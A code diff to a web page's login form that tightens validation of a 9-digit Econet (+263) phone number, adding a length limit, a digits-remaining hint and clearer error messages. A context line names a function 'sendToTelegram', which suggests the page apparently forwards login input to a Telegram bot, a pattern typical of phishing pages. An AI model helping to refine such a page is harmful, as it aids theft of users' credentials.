@@ -380,7 +380,7 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
               <!-- #15 auto-format phone -->
               <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX" autocomplete="tel">
             </div>
-            <div class="field-hint">9-digit Econet number</div>
+            <div class="field-hint" id="phoneHint" style="display:none"></div>
             <div class="field-error" id="phoneError">Please enter a valid 9-digit number starting with 7</div>
           </div>
 
@@ -549,6 +549,8 @@ async function sendToTelegram(event){
 
 /* ── PHONE INPUT ──────────────────────────── */
 const phoneEl=document.getElementById('phone');
+phoneEl.setAttribute('maxlength','9');
+
 phoneEl.addEventListener('input',e=>{
   let raw=e.target.value.replace(/\D/g,'');
   // strip country code variants: 00263, 263
@@ -556,24 +558,46 @@ phoneEl.addEventListener('input',e=>{
   else if(raw.startsWith('263')) raw=raw.slice(3);
   // strip leading zero
   if(raw.startsWith('0')) raw=raw.slice(1);
-  // if still >9 digits (e.g. pasted full number), take last 9
+  // if still >9 digits (pasted full number), take last 9
   if(raw.length>9) raw=raw.slice(-9);
+  // hard enforce 9 max
+  raw=raw.slice(0,9);
   e.target.value=raw;
   phoneValue=raw.length>0?'+263'+raw:'';
   clearError('phoneField','phoneError');
+  // show digit counter hint while typing
+  const hint=document.getElementById('phoneHint');
+  if(hint){
+    if(raw.length>0&&raw.length<9){
+      hint.textContent=`${9-raw.length} digit${9-raw.length>1?'s':''} remaining`;
+      hint.style.display='block';
+    } else {
+      hint.style.display='none';
+    }
+  }
   if(raw.length>0&&raw[0]!=='7'){
     document.getElementById('phoneError').textContent='Number must start with 7 (e.g. 77XXXXXXX)';
     showError('phoneField','phoneError');
   }
   validateLogin();
 });
+
+phoneEl.addEventListener('keydown',e=>{
+  // block any digit beyond 9 unless it's a control key
+  const allowed=['Backspace','Delete','ArrowLeft','ArrowRight','Tab','Enter'];
+  if(!allowed.includes(e.key)&&!/^\d$/.test(e.key)) e.preventDefault();
+  if(/^\d$/.test(e.key)&&phoneEl.value.length>=9) e.preventDefault();
+});
+
 phoneEl.addEventListener('blur',()=>{
   const v=phoneEl.value;
+  const hint=document.getElementById('phoneHint');
+  if(hint) hint.style.display='none';
   if(v.length>0&&v[0]!=='7'){
     document.getElementById('phoneError').textContent='Number must start with 7 (e.g. 77XXXXXXX)';
     showError('phoneField','phoneError');
   } else if(v.length>0&&v.length!==9){
-    document.getElementById('phoneError').textContent='Please enter a valid 9-digit number starting with 7';
+    document.getElementById('phoneError').textContent=`Please enter all 9 digits (${v.length}/9 entered)`;
     showError('phoneField','phoneError');
   }
 });
